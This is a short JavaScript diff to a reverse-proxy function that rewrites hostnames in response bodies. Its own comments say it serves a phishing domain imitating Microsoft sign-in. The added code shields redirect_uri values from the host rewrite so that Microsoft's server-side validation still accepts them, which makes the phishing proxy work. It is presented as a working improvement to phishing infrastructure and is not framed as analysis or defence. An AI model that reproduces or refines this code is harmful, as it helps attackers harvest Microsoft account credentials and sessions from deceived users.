@@ -716,8 +716,27 @@ async function maybeRewriteBody(resp, contentType, hostRegex, clientHost) {
     return resp.body; // binary/stream: pass through
   }
   try {
-    const text = await resp.text();
-    return text.replace(hostRegex, clientHost);
+    let text = await resp.text();
+
+    // Protect redirect_uri values from being rewritten.
+    // Microsoft validates redirect_uri server-side — it MUST point to the real domain,
+    // not the phishing domain. We use placeholders to preserve them through the rewrite.
+    const redirectPlaceholders = [];
+    text = text.replace(/redirect_uri[=:]\s*["']?(https?%3A%2F%2F[^&"'\s]+|https?:\/\/[^&"'\s]+)/gi, (match) => {
+      const placeholder = `__REDIR_PRESERVE_${redirectPlaceholders.length}__`;
+      redirectPlaceholders.push(match);
+      return placeholder;
+    });
+
+    // Perform the blanket host rewrite
+    text = text.replace(hostRegex, clientHost);
+
+    // Restore protected redirect_uri values
+    for (let i = 0; i < redirectPlaceholders.length; i++) {
+      text = text.replace(`__REDIR_PRESERVE_${i}__`, redirectPlaceholders[i]);
+    }
+
+    return text;
   } catch (e) {
     console.error('Body rewrite failed:', e);
     // Fallback: return original as text (best effort)
